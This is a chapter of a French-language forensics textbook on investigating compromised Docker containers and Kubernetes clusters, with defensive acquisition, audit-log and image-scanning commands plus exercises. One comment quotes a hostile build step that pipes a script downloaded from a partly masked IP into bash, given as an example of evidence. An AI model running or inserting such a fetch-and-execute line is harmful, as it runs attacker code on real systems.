% ============================================================================
% Fichier  : partie5/P05_C23_containers_cloud_native.tex
% Titre    : Forensique Cloud-Native et Conteneurs
% Auteur   : MINKA MI NGUIDJOÏ Thierry Emmanuel
% Version  : 1.0 -- Juin 2026
% Statut   : RÉDIGÉ
% Sources  : Construit ex-nihilo (aucune source projet ne couvre les
%            conteneurs). Prolonge directement Ch.17 (forensique cloud
%            IaaS) au niveau de la couche orchestration/conteneurs.
% Positionnement : Troisième chapitre de la Partie V. Le Ch.17 a traité
%                  le cloud au niveau VM/IaaS (CloudTrail, snapshots EBS).
%                  Ce chapitre descend d'un niveau d'abstraction : que se
%                  passe-t-il quand l'unité de calcul n'est plus une VM
%                  mais un conteneur vivant quelques secondes ou minutes ?
% ============================================================================

\chapter{Forensique Cloud-Native et Conteneurs}
\label{chap:containers}

\epigraph{%
    « Un conteneur compromis peut avoir disparu avant même que vous
    ayez fini de lire l'alerte qui vous en informe. »%
}{--- Réalité opérationnelle du cloud-native}

\niveauChapitre{Expert}{%
    Notions de Docker et Kubernetes requises. Chapitre~\ref{chap:for-cloud}
    (forensique cloud IaaS) indispensable~: ce chapitre descend d'un
    niveau d'abstraction supplémentaire.%
}

\begin{boxobjectifs}
\begin{itemize}
    \item Comprendre l'architecture conteneurs~/~orchestrateur et
          identifier où résident les données forensiques à chaque couche.
    \item Acquérir l'état d'un conteneur Docker compromis avant
          sa destruction~: système de fichiers, processus, réseau.
    \item Analyser les journaux et événements Kubernetes pour
          reconstituer une chronologie d'attaque cloud-native.
    \item Gérer l'éphéméralité extrême des conteneurs~: stratégies
          de capture en environnement de production.
    \item Identifier les vecteurs d'attaque spécifiques aux
          conteneurs~: évasion, images compromises, secrets exposés.
    \item Documenter une investigation cloud-native dans le respect
          des principes de custody adaptés à cet environnement.
\end{itemize}
\end{boxobjectifs}

\bigskip

% ============================================================================
\section*{Pourquoi un chapitre dédié aux conteneurs}
% ============================================================================

Le Chapitre~\ref{chap:for-cloud} a traité la forensique cloud au niveau
de la machine virtuelle~: CloudTrail enregistre qui a lancé une instance
EC2, un snapshot EBS préserve son disque. Mais l'architecture moderne
des applications cloud ne s'arrête pas aux VMs~: à l'intérieur de
chaque VM tournent désormais des dizaines, parfois des centaines de
\textbf{conteneurs} --- des unités d'exécution légères, créées et
détruites en quelques secondes, orchestrées par des systèmes comme
\termecle{Kubernetes}\index{Kubernetes}.

Cette architecture pousse l'éphéméralité (déjà identifiée au
Ch.~\ref{chap:for-cloud} comme défi central du cloud) à son extrême~:
un conteneur compromis peut être détruit par l'orchestrateur lui-même
--- pour cause de redémarrage automatique, de mise à l'échelle, ou
de politique de sécurité --- avant que l'investigateur n'ait eu le
temps d'intervenir.

\separateur

% ============================================================================
\section{Architecture Conteneurs~: où Résident les Données}
\label{sec:architecture-conteneurs}
% ============================================================================

\subsection{Les couches d'abstraction}

\begin{tableaucours}{p{2.8cm}p{3.5cm}p{5.5cm}}{%
    \tableauHeader{Couche} &
    \tableauHeader{Durée de vie typique} &
    \tableauHeader{Données forensiques}
}
\textbf{Image} (Docker Image) & Persistante (registre) &
    Code applicatif, dépendances, configuration~; analysable
    hors-ligne comme un firmware (Ch.~\ref{chap:for-iot}) \\
\textbf{Conteneur} (instance d'exécution) & Secondes à jours &
    Processus actifs, système de fichiers en écriture
    (\textit{layer} superposé), variables d'environnement \\
\textbf{Pod} (Kubernetes~: groupe de conteneurs) & Minutes à mois &
    Logs agrégés, réseau interne au Pod, volumes partagés \\
\textbf{N\oe ud} (machine hébergeant les Pods) & Heures à années &
    Logs systemd/journald (Ch.~\ref{chap:for-sys}), logs kubelet,
    images Docker en cache \\
\textbf{Cluster} (orchestrateur complet) & Persistant &
    \texttt{etcd} (base de données d'état)~; audit logs API
    Kubernetes~; configuration RBAC \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~23.1 --- Couches d'abstraction et données forensiques}\end{center}

\subsection{Le défi de l'éphéméralité extrême}

\begin{boxCRO}
\textbf{Analyse CRO --- Éphéméralité des conteneurs}

$\mathcal{R}$ (Fiabilité)~: capturer l'état exact d'un conteneur
en cours d'exécution avant sa destruction nécessite une réaction
en quelques secondes à minutes. Un conteneur Kubernetes peut être
détruit automatiquement par une politique de \textit{liveness probe}
(redémarrage si le processus principal échoue) sans intervention
humaine.

$\mathcal{O}$ (Opposabilité)~: l'absence de preuve directe (le
conteneur a disparu) ne signifie pas l'absence d'incident~--- mais
elle complique significativement la démonstration. Les logs
externalisés (Section~\ref{sec:logs-k8s}) deviennent la source
probatoire principale.

$\mathcal{C}$ (Confidentialité)~: un cluster Kubernetes multi-tenant
héberge souvent les charges de travail de plusieurs clients sur
la même infrastructure physique~--- l'investigation d'un Pod doit
être rigoureusement cantonnée à son périmètre (\textit{namespace}).

\cro{$\downarrow$ cantonnement namespace}{$\downarrow\downarrow$ disparition rapide}{$\sim$ dépend des logs externalisés}

\textbf{Conséquence opérationnelle~:} contrairement aux Ch.~14--18
où l'acquisition pouvait souvent attendre quelques heures, la
forensique conteneur exige une \textbf{architecture de détection
et réponse automatisée} (Section~\ref{sec:strategie-capture})
mise en place \emph{avant} l'incident.
\end{boxCRO}

% ============================================================================
\section{Acquisition d'un Conteneur Docker Compromis}
\label{sec:acquisition-docker}
% ============================================================================

\subsection{Capture de l'état d'un conteneur en cours d'exécution}

\begin{boxoutils}{Acquisition forensique d'un conteneur Docker actif}
\begin{lstlisting}[language=bash_forensique]
# PRINCIPE : agir vite, dans l'ordre de volatilite (RFC 3227
# adapte aux conteneurs, cf. Ch. 21 pour la logique generale)

# Etape 1 : identifier le conteneur suspect
docker ps
# CONTAINER ID   IMAGE          STATUS         NAMES
# a3f7b29c8e1d   webapp:latest  Up 47 minutes  prod-webapp-3

# Etape 2 : capturer les processus actifs DANS le conteneur
docker top a3f7b29c8e1d -eo pid,ppid,cmd,etime
# Revele les processus en cours -- equivalent du Volatility
# pslist (Ch. 14) mais a l'echelle du conteneur

# Etape 3 : capturer les connexions reseau du conteneur
docker exec a3f7b29c8e1d cat /proc/net/tcp
# Ou, depuis l'hote (sans modifier le conteneur) :
nsenter -t $(docker inspect -f '{{.State.Pid}}' a3f7b29c8e1d) \
    -n netstat -tupln

# Etape 4 : capturer les logs du conteneur (stdout/stderr)
docker logs a3f7b29c8e1d --timestamps > /output/container_logs.txt

# Etape 5 : capturer le diff du systeme de fichiers
# (ce qui a ete modifie par rapport a l'image d'origine)
docker diff a3f7b29c8e1d > /output/container_fs_diff.txt
# Resultat type :
# A /tmp/malware.sh        <- fichier Ajoute
# C /etc/passwd            <- fichier Change
# D /var/log/auth.log      <- fichier Detruit (anti-forensique !)

# Etape 6 : exporter le systeme de fichiers complet du conteneur
docker export a3f7b29c8e1d -o /output/container_export.tar
sha256sum /output/container_export.tar > /output/container_hash.txt

# Etape 7 : capturer l'image source pour comparaison
docker save webapp:latest -o /output/image_source.tar
# Comparer image_source (etat propre) avec container_export
# (etat compromis) pour isoler precisement les modifications

# Etape 8 : SEULEMENT APRES capture complete -- arreter le conteneur
# (preserve l'etat pour investigation differee si necessaire)
docker pause a3f7b29c8e1d   # gele sans detruire
# docker stop -- a eviter en premier reflexe : declenche parfois
# des hooks de nettoyage (anti-forensique involontaire)
\end{lstlisting}
\end{boxoutils}

\begin{boxalert}
\textbf{\texttt{docker diff}~: l'outil le plus sous-utilisé en
forensique conteneur}

La commande \texttt{docker diff} révèle en une seconde tous les
fichiers ajoutés, modifiés ou supprimés par rapport à l'image
d'origine immuable. C'est l'équivalent conteneur du \texttt{\$UsnJrnl}
(Ch.~\ref{chap:for-sys})~: elle révèle non seulement l'activité
malveillante mais aussi les \textbf{tentatives de suppression
de logs internes} au conteneur (marquées \texttt{D} dans la sortie).
Toujours exécuter cette commande \textbf{avant} tout arrêt du conteneur.
\end{boxalert}

\subsection{Capture mémoire d'un conteneur}

\begin{boxoutils}{Capture mémoire d'un processus conteneurisé}
\begin{lstlisting}[language=bash_forensique]
# Un conteneur partage le noyau de l'hote -- pas d'hyperviseur
# separe comme pour une VM. La capture memoire cible le ou les
# processus du conteneur depuis l'hote.

# Identifier le PID hote correspondant au conteneur
CONTAINER_PID=$(docker inspect -f '{{.State.Pid}}' a3f7b29c8e1d)
echo $CONTAINER_PID
# 48291

# Capturer la memoire du processus (sur l'hote, avec privileges)
gcore -o /output/container_memory $CONTAINER_PID
# Genere /output/container_memory.48291

# Analyse avec Volatility 3 (meme outil que Ch. 14, profil Linux)
python3 vol.py -f /output/container_memory.48291 \
    linux.bash    # historique bash si shell actif dans le conteneur
python3 vol.py -f /output/container_memory.48291 \
    linux.pslist  # processus enfants du processus principal

# Alternative : capture de la memoire complete de l'hote
# (capture TOUS les conteneurs, plus lourd mais plus complet)
# -- utiliser LiME (Linux Memory Extractor) comme au Ch. 14
# pour les systemes Linux
\end{lstlisting}
\end{boxoutils}

% ============================================================================
\section{Logs et Événements Kubernetes}
\label{sec:logs-k8s}
% ============================================================================

\subsection{Architecture de logging Kubernetes}

\begin{tableaucours}{p{3.0cm}p{4.0cm}p{4.5cm}}{%
    \tableauHeader{Source} &
    \tableauHeader{Contenu} &
    \tableauHeader{Rétention typique}
}
\textbf{API Server Audit Log} & Chaque appel à l'API Kubernetes~:
    qui, quoi, quand &
    Selon configuration (souvent~7--30~jours)~; \textbf{le plus
    important pour la forensique} \\
\textbf{Kubelet logs} & Activité du nœud~: démarrage/arrêt de Pods &
    Logs systemd locaux (Ch.~\ref{chap:for-sys})~; rotation rapide \\
\textbf{Pod logs} & \texttt{stdout}/\texttt{stderr} de l'application &
    Perdus à la suppression du Pod sauf agrégation externe
    (ELK, Loki) \\
\textbf{etcd} & État complet du cluster (configuration, secrets) &
    Persistant tant que le cluster existe~; snapshot recommandé \\
\textbf{Events} (\texttt{kubectl get events}) & Événements du cycle
    de vie (création, échec, redémarrage) &
    \textbf{1~heure par défaut} --- extrêmement volatile \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~23.2 --- Sources de logs Kubernetes}\end{center}

\begin{boxoutils}{Extraction de l'audit log Kubernetes API Server}
\begin{lstlisting}[language=bash_forensique]
# Format de l'Audit Log Kubernetes (JSON Lines)
# Localisation typique : /var/log/kubernetes/audit.log
# (ou exporte vers un SIEM -- cf. principe de forwarding, Ch. 21)

# Filtrer les actions sur un namespace specifique
cat audit.log | jq 'select(.objectRef.namespace == "production")'

# Identifier qui a cree/modifie/supprime des ressources
cat audit.log | jq -r 'select(.verb == "create" or .verb ==
    "delete") | [.requestReceivedTimestamp, .verb,
    .objectRef.resource, .objectRef.name,
    .user.username, .sourceIPs[0]] | @csv'

# Detecter l'execution de commandes dans un Pod (kubectl exec)
# -- vecteur d'attaque frequent une fois un acces initial obtenu
cat audit.log | jq 'select(.objectRef.subresource == "exec")'
# Resultat type :
# {
#   "verb": "create",
#   "objectRef": {"resource": "pods", "name": "prod-webapp-3",
#                  "subresource": "exec"},
#   "user": {"username": "system:serviceaccount:default:ci-cd"},
#   "requestReceivedTimestamp": "2026-03-13T02:17:30Z"
# }
# -- un compte de service CI/CD executant un kubectl exec
#    en pleine nuit est hautement suspect

# Detecter la creation de Pods avec privileges eleves
# (vecteur d'evasion de conteneur frequent)
cat audit.log | jq 'select(.verb == "create" and
    .objectRef.resource == "pods") |
    select(.requestObject.spec.containers[].securityContext.privileged
    == true)'
\end{lstlisting}
\end{boxoutils}

\begin{boxscenario}{Reconstitution d'une attaque Kubernetes --- cas MVOM étendu}
Extension de l'affaire MVOM (Ch.~\ref{chap:for-cloud})~: TRANSBOIS~SA
utilisait en réalité un cluster Kubernetes pour héberger ses applications.
L'audit log API Server révèle~:

\begin{lstlisting}[language=bash_forensique]
02:14:09  CREATE  pods/exec  prod-webapp-3  user:ci-cd-sa
          IP:185.220.XX.XX
02:14:15  CREATE  pods/exec  prod-webapp-3  user:ci-cd-sa
          subresource:exec  command:["/bin/sh"]
02:16:50  UPDATE  pods/prod-webapp-3  user:ci-cd-sa
          (modification de fichiers via exec, pas de trace
           directe dans audit log -- voir docker diff)
02:19:45  DELETE  pods/prod-webapp-3  user:system:kube-scheduler
          reason:Evicted (le pod a ete automatiquement detruit
          par l'orchestrateur suite a une alerte ressources)
\end{lstlisting}

\textbf{Constatation~:} l'audit log API Server enregistre une
création de session \texttt{exec} sur le Pod \texttt{prod-webapp-3}
à 02h14:15, initiée par le compte de service \texttt{ci-cd-sa}
depuis l'IP \texttt{185.220.XX.XX}.\\[0.3ex]
\textbf{Analyse~:} la destruction automatique du Pod à 02h19:45
(raison~: \texttt{Evicted}, déclenchée par l'orchestrateur
lui-même et non par l'attaquant) illustre la fragilité probatoire
spécifique aux environnements cloud-native~: \textbf{le système
a lui-même détruit la preuve principale} (le conteneur compromis)
dans le cadre de son fonctionnement normal, 5~minutes et~30~secondes
après l'intrusion. Seul l'audit log API Server, externalisé
vers un SIEM distinct du cluster, a permis de reconstituer
cette chronologie.
\end{boxscenario}

% ============================================================================
\section{Vecteurs d'Attaque Spécifiques aux Conteneurs}
\label{sec:vecteurs-attaque}
% ============================================================================

\subsection{Images compromises}

\begin{tableaucours}{p{3.5cm}p{4.0cm}p{4.5cm}}{%
    \tableauHeader{Vecteur} &
    \tableauHeader{Mécanisme} &
    \tableauHeader{Trace forensique}
}
\textbf{Image malveillante} & Image publique sur Docker~Hub
    contenant un payload caché &
    Hash de l'image~; comparaison avec le registre officiel~;
    \texttt{docker history} pour voir les couches \\
\textbf{Dépendance compromise} & Bibliothèque tierce incluse
    dans l'image (\textit{supply chain attack}) &
    Analyse du \texttt{Dockerfile}~/ \texttt{requirements.txt}~;
    scan de vulnérabilités (Trivy, Grype) \\
\textbf{Secrets exposés} & Clés API, mots de passe codés en dur
    dans l'image &
    \texttt{docker history --no-trunc}~; scan avec
    \texttt{trufflehog} ou \texttt{gitleaks} \\
\textbf{Évasion de conteneur} & Exploitation d'une vulnérabilité
    pour sortir du conteneur vers l'hôte &
    Logs kernel (\texttt{dmesg})~; alertes runtime
    (Falco)~; processus inattendus sur l'hôte \\
\end{tableaucours}
\vspace{-0.8em}
\begin{center}{\small\itshape Tableau~23.3 --- Vecteurs d'attaque conteneurs et traces forensiques}\end{center}

\begin{boxoutils}{Analyse forensique d'une image Docker suspecte}
\begin{lstlisting}[language=bash_forensique]
# Examiner l'historique des couches de l'image (sans l'executer)
docker history --no-trunc webapp:latest
# Revele chaque commande RUN/COPY/ADD ayant construit l'image
# -- une commande "RUN curl http://185.220.XX.XX/payload.sh |
#    bash" serait visible ici

# Extraire et analyser le contenu de l'image (comme un firmware,
# cf. Ch. 18 -- meme logique avec Binwalk)
docker save webapp:latest -o image.tar
tar -xf image.tar -C /output/image_extracted/
# Chaque couche est un fichier layer.tar -- extraire et analyser

# Scanner les vulnerabilites connues (CVE)
trivy image webapp:latest
# Resultat type :
# webapp:latest (alpine 3.18)
# Total: 14 (HIGH: 3, CRITICAL: 1)
# CVE-2024-XXXX  openssl  CRITICAL  Remote Code Execution

# Rechercher des secrets codes en dur
trufflehog docker --image webapp:latest
# Detecte : cles AWS, tokens API, mots de passe en clair dans
# les couches de l'image (meme si supprimes dans une couche
# ulterieure -- ils restent dans l'historique des couches !)

# Comparer le hash de l'image avec le registre officiel
docker inspect webapp:latest --format='{{.Id}}'
# Comparer avec le digest publie sur Docker Hub / registre prive
# Une divergence indique une image modifiee localement
\end{lstlisting}
\end{boxoutils}

\begin{boiteRemarque}{Les secrets supprimés restent dans l'historique des couches}
Une erreur fréquente des développeurs~: ajouter un secret (clé API)
dans une couche Docker, puis le supprimer dans une couche ultérieure
en pensant l'avoir effacé. \textbf{Le secret reste accessible} dans
l'historique des couches de l'image, car Docker conserve chaque
couche indépendamment. C'est un parallèle direct avec le wiping
de fichiers (Ch.~\ref{chap:anti-for})~: la suppression apparente
ne supprime pas la donnée sous-jacente. Cette caractéristique est
à la fois une faille de sécurité courante \emph{et} une opportunité
forensique pour l'investigateur.
\end{boiteRemarque}

% ============================================================================
\section{Stratégie de Capture en Production}
\label{sec:strategie-capture}
% ============================================================================

\subsection{Pourquoi l'acquisition réactive est insuffisante}

Contrairement aux scénarios des Chapitres~\ref{chap:for-sys}
à~\ref{chap:for-iot} où l'investigateur arrive après l'incident avec
le temps de mettre en place une acquisition méthodique, l'éphéméralité
extrême des conteneurs exige une \textbf{architecture préventive}.

\begin{boxPNC}
\textbf{Recommandations architecturales pour la \textit{readiness}
forensique cloud-native}

\begin{enumerate}
    \item \textbf{Externalisation systématique des logs}~: agrégation
          en temps réel (Fluentd, Loki) vers un système distinct
          du cluster, avec rétention minimale de~90~jours.
    \item \textbf{Audit log API Server activé et exporté}~:
          configuration \texttt{Metadata} ou \texttt{RequestResponse}
          (niveau de détail) selon la criticité~; export immédiat
          hors du cluster.
    \item \textbf{Politique d'\textit{eviction} documentée}~: en cas
          d'incident suspecté, désactiver temporairement
          l'\textit{auto-scaling} et les redémarrages automatiques
          pour préserver l'état du conteneur compromis.
    \item \textbf{Runtime security monitoring}~: outils comme
          \textbf{Falco} détectent et alertent en temps réel sur
          les comportements anormaux (exécution de shell inattendue,
          accès fichier sensible), avec capture automatique du
          contexte au moment de l'alerte.
    \item \textbf{Snapshots etcd réguliers}~: préservent l'état
          complet de la configuration du cluster à intervalles
          définis, indépendamment des Pods individuels.
\end{enumerate}
\end{boxPNC}

\subsection{Procédure d'urgence~: les 5 premières minutes}

\begin{boxoutils}{Checklist d'urgence -- incident conteneur détecté}
\begin{lstlisting}[language=bash_forensique]
# MINUTE 0-1 : geler la situation
kubectl label pod prod-webapp-3 quarantine=true
    --namespace=production
# Isoler via NetworkPolicy plutot que supprimer immediatement
kubectl annotate pod prod-webapp-3 forensics.io/preserve=true
# (annotation personnalisee pour signaler aux controllers
#  de ne pas recycler ce pod automatiquement, si configure)

# MINUTE 1-3 : capturer l'etat du conteneur
docker diff <container-id>
docker logs <container-id> --timestamps
docker top <container-id> -eo pid,ppid,cmd

# MINUTE 3-5 : exporter et hasher
docker export <container-id> -o /output/evidence.tar
sha256sum /output/evidence.tar

# APRES : analyse approfondie sans pression temporelle,
# en suivant les procedures des Ch. 14 (systeme) et Ch. 15 (reseau)
# sur les donnees exportees
\end{lstlisting}
\end{boxoutils}

\separateur

\begin{boxresume}
\textbf{Ce qu'il faut retenir de ce chapitre~:}
\begin{itemize}
    \item \textbf{Cinq couches d'abstraction}~: Image (persistante,
          analysable comme un firmware) $\to$ Conteneur (secondes
          à jours) $\to$ Pod $\to$ N\oe ud $\to$ Cluster. Chaque
          couche a ses propres données forensiques.

    \item \textbf{\texttt{docker diff} en premier réflexe}~: révèle
          en une commande tous les fichiers ajoutés, modifiés ou
          supprimés par rapport à l'image d'origine immuable
          --- équivalent conteneur du \texttt{\$UsnJrnl}.

    \item \textbf{L'audit log API Server Kubernetes} est la source
          probatoire la plus importante~: contrairement aux Pod logs
          (perdus à la suppression) et aux Events (rétention~1h),
          il peut être externalisé et conservé durablement.

    \item \textbf{L'orchestrateur peut détruire la preuve lui-même}~:
          \textit{eviction}, \textit{auto-scaling}, redémarrage
          automatique sont des fonctionnements normaux qui
          anéantissent l'état d'un conteneur compromis. C'est
          un défi structurel propre au cloud-native.

    \item \textbf{Les secrets supprimés restent dans l'historique
          des couches Docker}~--- parallèle direct avec le wiping
          de fichiers (Ch.~\ref{chap:anti-for}). Utiliser
          \texttt{docker history --no-trunc} et des scanners
          de secrets (trufflehog, gitleaks).

    \item \textbf{La \textit{readiness} prime sur la réactivité}~:
          contrairement aux scénarios précédents, l'éphéméralité
          extrême exige une architecture préventive (externalisation
          des logs, runtime monitoring avec Falco, politiques
          d'\textit{eviction} documentées) mise en place
          \emph{avant} l'incident.
\end{itemize}
\end{boxresume}

\bigskip

\begin{boxexo}[title={\ding{45}\quad Exercice~23.1 --- Identifier les sources \niveaubase}]
Pour chacune des questions suivantes, identifiez la source de
données la plus appropriée (Tableau~23.1 ou~23.2) et la commande
pour l'obtenir~:
\begin{enumerate}[(a)]
    \item Quels fichiers un conteneur a-t-il modifiés par rapport
          à son image d'origine~?
    \item Qui a exécuté une commande \texttt{kubectl exec} sur un
          Pod en production la nuit dernière~?
    \item Un conteneur contient-il des clés API codées en dur,
          même si elles ont été supprimées dans une couche
          ultérieure du Dockerfile~?
    \item Quel processus tournait dans un conteneur juste avant
          sa destruction par l'orchestrateur~?
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~23.2 --- Analyse de docker diff \niveaumoyen}]
La commande \texttt{docker diff prod-api-7} sur un conteneur
suspecté compromis donne~:
\begin{lstlisting}[language=bash_forensique]
A /tmp/.hidden/backdoor.py
A /tmp/.hidden/requirements_extra.txt
C /etc/crontab
C /app/config.yaml
D /var/log/app/access.log
D /var/log/app/error.log
\end{lstlisting}
\begin{enumerate}[(a)]
    \item Interprétez chaque ligne~: que signifient A, C, D~?
    \item Quelle hypothèse formulez-vous sur l'objectif de
          l'attaquant à partir de la modification de
          \texttt{/etc/crontab}~? Quelle technique du Ch.~18
          (IoT) cela rappelle-t-il~?
    \item Les fichiers \texttt{access.log} et \texttt{error.log}
          ont été supprimés (D). Cette suppression elle-même
          a-t-elle laissé une trace~? Où la chercheriez-vous~?
    \item Rédigez les 3~premières constatations de votre rapport
          à partir de ce \texttt{docker diff}, en respectant
          la structure du Ch.~\ref{chap:rapport}.
\end{enumerate}
\end{boxexo}

\begin{boxexo}[title={\ding{45}\quad Exercice~23.3 --- Incident Kubernetes complet \niveauexpert}]
Une startup camerounaise de paiement mobile (architecture
Kubernetes sur infrastructure cloud) signale une activité suspecte~:
un Pod traitant les transactions a présenté un pic de trafic réseau
sortant anormal pendant 8~minutes avant d'être automatiquement
redémarré par une \textit{liveness probe} ayant échoué. Le Pod
redémarré est ``propre''~--- aucune trace de compromission visible
dans son état actuel.
\begin{enumerate}[(a)]
    \item Le Pod compromis original a disparu. Quelles sources
          de données restent disponibles pour l'investigation~?
          Classez-les par fiabilité et disponibilité probable.
    \item Quelles requêtes \texttt{jq} sur l'audit log API Server
          formuleriez-vous pour reconstituer l'activité sur ce
          Pod dans la fenêtre de~8~minutes~?
    \item L'entreprise n'avait pas externalisé ses Pod logs
          (perdus à la destruction). Quelle recommandation
          architecturale (Section~\ref{sec:strategie-capture})
          auriez-vous formulée \emph{avant} cet incident pour
          éviter cette perte~?
    \item Cette affaire implique des données financières de
          clients camerounais (Mobile Money). Quelles obligations
          de la \loicam{2024/017} (Ch.~\ref{chap:droit-cam})
          s'appliquent à cette startup concernant la notification
          de l'incident~?
    \item Rédigez la Synthèse Exécutive (Niveau~1, Ch.~\ref{chap:rapport})
          de cette investigation, en assumant honnêtement les
          limites probatoires dues à la perte du Pod original.
\end{enumerate}
\end{boxexo}

\bigskip

\begin{boxinfo}
\textbf{Transition.} La forensique cloud-native illustre une tendance
de fond~: l'infrastructure informatique devient de plus en plus
abstraite et éphémère, rendant l'acquisition réactive de plus en
plus difficile. Cette tendance se prolonge dans le chapitre suivant,
qui examine l'impact de l'informatique quantique sur la pérennité
des preuves numériques signées aujourd'hui~--- un horizon où
l'intégrité cryptographique elle-même devra être repensée.
\end{boxinfo}